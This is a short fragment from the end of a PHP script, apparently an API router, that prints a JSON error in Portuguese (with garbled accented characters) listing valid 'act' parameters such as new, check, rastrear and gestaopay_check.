    exit;
}

echo json_encode(["error" => "AÃ§Ã£o invÃ¡lida. Use ?act=new, ?act=check, ?act=rastrear, ?act=fusion_new, ?act=fusion_check, ?act=gestaopay_check ou ?act=wintech_new"]);

